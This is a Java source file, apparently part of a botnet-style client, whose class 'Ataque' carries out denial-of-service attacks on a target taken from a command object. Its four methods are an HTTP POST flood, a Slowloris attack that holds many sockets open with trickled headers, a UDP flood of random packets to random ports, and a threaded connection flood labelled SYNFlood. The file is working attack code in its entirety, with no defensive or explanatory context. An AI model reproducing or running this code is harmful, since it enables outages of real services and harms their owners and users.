import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Ataque {

	private static final int HTTP_PORT = 80;
	private static final int DELAY = 100;

	public static void httpFlood(Comando comando) {
		URL url = comando.getObjetivo();
		HttpURLConnection connection = null;
		System.out.println("Iniciando ataque : HTTPFLOOD - Objetivo : " + comando.getObjetivo());

		while (System.currentTimeMillis() <= comando.getDuracion()) {
			try {
				String urlParameters = "param1=" + URLEncoder.encode("???", "UTF-8") + "&param2="
						+ URLEncoder.encode("???", "UTF-8");
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				connection.setRequestProperty("Content-Length", Integer.toString(urlParameters.getBytes().length));
				connection.setRequestProperty("Content-Language", "en-US");
				connection.setUseCaches(false);
				connection.setDoOutput(true);
				DataOutputStream out = new DataOutputStream(connection.getOutputStream());
				out.writeBytes(urlParameters);
				out.close();

			} catch (IOException e) {
				e.printStackTrace();
				return;
			}

		}
		System.out.println("Ataque finalizado.");
		return;
	}

	public static void slowlorisFlood(Comando comando, int threads) throws UnknownHostException {
		String host = comando.ipFromURL();
		System.out.println("Iniciando ataque : SLOWLORIS - Objetivo : " + comando.getObjetivo());

		ExecutorService ex = Executors.newCachedThreadPool();

		for (int i = 0; i < threads; i++) {
			ex.execute(new Runnable() {
				public void run() {
					try {
						Socket socket = new Socket(host, HTTP_PORT);
						PrintWriter out = new PrintWriter(socket.getOutputStream());
						String payload = "GET / HTTP/1.1\r\n" + "Host: " + host + "\r\n"
								+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
								+ "Content-Length: 42\r\n";

						out.print(payload);
						out.flush();
						int it = 0;
						while (it < DELAY) {
							out.print("X-a: b\r\n");
							out.flush();
							Thread.sleep(DELAY);
							it++;
						}
						out.close();
						socket.close();
						
					} catch (Exception e) {
						e.printStackTrace();
						return;
					}
				}

			});

		}
		ex.shutdown();
		boolean finished = false;
		try {
			finished = ex.awaitTermination(1, TimeUnit.MINUTES);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		if (finished) {
			System.out.println("Ataque finalizado.");
		}
	}
	
	
	public static void UDPFlood(Comando comando) throws UnknownHostException, IOException{
		System.out.println("Iniciando ataque : UDPFLOOD - Objetivo : " + comando.getObjetivo());
		
		String target = comando.ipFromURL();
		DatagramSocket udpSocket = new DatagramSocket();

		while(System.currentTimeMillis() < comando.getDuracion()){
			byte[] data = new byte[128];
			new Random().nextBytes(data);
			int randomPort = (int) ((Math.random() * 65534) + 1);
			udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), randomPort));
			
		}
		udpSocket.close();
		System.out.println("Finalizado ataque.");
	}
	
	
	public static void SYNFlood(Comando comando, int threads) throws UnknownHostException{
		System.out.println("Iniciando ataque : TCPFlood - Objetivo : " + comando.getObjetivo());
		String target = comando.ipFromURL();
		
		ExecutorService ex = Executors.newCachedThreadPool();
		for(int i=0;i<threads;i++){
			ex.execute(new Runnable() {
				@SuppressWarnings("resource")
				public void run() {
					while(System.currentTimeMillis() < comando.getDuracion()){
						int randomPort = (int) ((Math.random() * 65534) + 1);

						try {
							new Socket(target,randomPort);
						} catch (IOException e) {
							e.printStackTrace();
							return;
						}
					}
				}
			});
		}
		ex.shutdown();
		boolean finished = false;
		try {
			finished = ex.awaitTermination(1, TimeUnit.MINUTES);
		} catch (InterruptedException e) {
			e.printStackTrace();
			System.out.println("threads terminados.");
		}
		if (finished) {
			System.out.println("Ataque finalizado.");
		}

	}

}
